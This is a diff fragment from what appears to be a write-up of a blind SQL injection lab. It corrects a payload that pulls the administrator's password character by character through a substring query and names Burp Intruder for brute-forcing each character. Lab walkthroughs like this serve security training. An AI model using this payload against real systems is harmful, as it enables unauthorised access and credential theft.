@@ -24,7 +24,7 @@ I found, 20 is the length of password.
 
 #Step 3: Bruteforce the password using
 
-6CDzCCQDL1zVFRNz' and substring((select password from users where username = 'administrator'), 1, 1) = a--
+6CDzCCQDL1zVFRNz' and substring((select password from users where username = 'administrator'), 1, 1) = 'a'--
 
 use intruder in place of 'a' ($a$) and determine the first character of password and then second character and so on.
 
